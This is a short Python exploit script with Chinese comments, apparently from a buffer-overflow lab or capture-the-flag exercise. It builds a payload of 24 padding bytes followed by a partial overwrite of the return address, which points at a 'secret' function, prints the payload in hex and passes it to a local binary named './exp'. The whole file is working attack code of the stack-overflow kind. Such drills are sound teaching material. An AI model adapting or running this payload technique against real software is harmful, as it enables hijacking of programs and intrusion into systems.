import subprocess

addr = 0x401196          # 换成你屏幕上 secret 的地址

payload = b"A" * 24 + addr.to_bytes(8, "little")[:3]
print("payload 十六进制 =", payload.hex())

subprocess.run(["./exp", payload])
